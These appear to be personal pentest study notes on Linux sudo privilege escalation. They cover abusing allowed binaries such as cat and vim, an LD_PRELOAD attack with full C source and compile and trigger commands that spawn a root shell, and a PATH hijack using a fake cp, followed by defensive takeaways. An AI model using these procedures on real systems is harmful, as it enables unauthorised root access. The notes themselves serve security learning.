## What is sudo ??

sudo used to run commands like other users if it has permission to the user .
Ex:- `sudo -u user` 
By default sudo use root user account/privillage but we can specify user by `-u` parameter.

```
sudo -l
```

Use to list what is the privillage of the current user that we logged in with sudo command.

>we have 3 methods in which we can Esc our privillage .

***1st method :-***

```
(root) NOPASSWD: /usr/bin/find
```

 ***Command's intended  functionality*** 

In this we can Esc our Priv by using the command which are made for their properties .

Ex :- `cat` command ahs functionality to read files if cat has set the permission of sudo . We can read `/etc/shadow` and crack the password of root .

***2nd method :-***

Some commands gives us functionality to execute other commands in their command.

Ex :- `vim` has functionality when we use `:` to save and exit in this if we write `!` and after this we can execute any command we want .

```
vim
:!/bin/bash
```

The command escape from vim give us the shell of the user in whose Priv vim was running .

***Passing environment variables :-***

Sometimes `sudo` is configured to keep certain environment variables from the user's session. If `LD_PRELOAD` is preserved, we can force the system to load our malicious shared object library before any others when a sudo command runs.

### Conditions

Look for `env_keep += LD_PRELOAD` when running `sudo -l`.

### Step 1: Create the Exploit Code

We write a small C program. We use the `_init()` function because it executes as soon as the library is loaded, even before the actual sudo command starts.

**File:** `/tmp/exploit.c`

C

```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD"); // Remove to avoid infinite loops
    setgid(0);              // Set Group ID to Root
    setuid(0);              // Set User ID to Root
    system("/bin/bash");    // Spawn Root Shell
}
```

### Step 2: Compile the Library

We need to turn this `.c` file into a shared object (`.so`) file so the system can load it.

Bash

```
gcc -fPIC -shared -o /tmp/exploit.so /tmp/exploit.c -nostartfiles
```

- **-fPIC**: Position Independent Code (standard for libraries).
    
- **-shared**: Tells GCC to create a shared library, not an executable.
    
- **-nostartfiles**: Prevents errors since we don't have a `main()` function.
    

### Step 3: Trigger the Root Shell

Now, run any command you are allowed to run with `sudo` (e.g., `find`, `cat`, `apache2`) and point `LD_PRELOAD` to your new library.

Bash

```
sudo LD_PRELOAD=/tmp/exploit.so <any_allowed_binary>
```

_Example:_ `sudo LD_PRELOAD=/tmp/exploit.so find`

---

## 4. Key Takeaways for Notes

- **Why it works:** `sudo` usually scrubs environment variables for safety. `env_keep` bypasses this safety check.
    
- **The Payload:** Our library resets permissions (`setuid(0)`) and calls `/bin/bash`.
    
- **Location:** Always use `/tmp` to store your exploit files as it is usually world-writable.


# PrivEsc: Sudo PATH Variable Manipulation

## 1. Concept

The `$PATH` variable tells the shell which directories to search for executable files. When you type `ls`, the shell looks through folders like `/usr/bin` and `/bin` to find the `ls` program.

**The Flaw:** If a script or command runs with `sudo` privileges and calls a binary by its name (e.g., `service apache2 start`), and the `sudo` configuration allows the user to keep their current `PATH`, we can trick the system into running our malicious file instead of the real one.

---

## 2. Identifying the Vulnerability

Run `sudo -l` and look for:

1. A command or custom script you can run with `sudo`.
    
2. Check if `secure_path` is **NOT** set, or if you can influence the PATH.
    
3. Check if the script/binary uses "relative names" (like `cp`, `ls`, `cat`) instead of "absolute paths" (like `/bin/cp`).
    

---

## 3. The Exploit Procedure

### Scenario

Imagine `sudo -l` shows you can run a custom script: `(root) NOPASSWD: /usr/local/bin/backup.sh`

And the script `backup.sh` contains:

Bash

```
#!/bin/bash
cp /var/www/html/* /backup/
```

Note that it uses `cp` and not `/bin/cp`.

### Step 1: Create a Malicious Binary

We will create a fake `cp` command that actually opens a shell.

Bash

```
cd /tmp
echo "/bin/bash" > cp
chmod +x cp
```

### Step 2: Modify the PATH Variable

We need to add our current location (`/tmp`) to the **beginning** of the PATH variable. This way, the system looks in `/tmp` for `cp` before looking in `/bin`.

Bash

```
export PATH=/tmp:$PATH
```

### Step 3: Run the Sudo Command

Now, run the allowed script with the `-E` flag (which tells sudo to **Preserve Environment** variables, including our new PATH).

Bash

```
sudo -E /usr/local/bin/backup.sh
```

**Outcome:** The script looks for `cp`, finds your fake version in `/tmp` first, and executes it as **root**, giving you a root shell.

---

## 4. Key Takeaways

- **Absolute vs. Relative:** Always use absolute paths (e.g., `/usr/bin/cat`) in scripts to prevent this.
    
- **The `-E` Flag:** This is crucial because it carries your modified `$PATH` over to the root session.
    
- **Secure Path:** Most modern systems use `Defaults secure_path="/usr/local/sbin:..."` in `/etc/sudoers` to prevent this exact attack by resetting the PATH for every sudo command.
---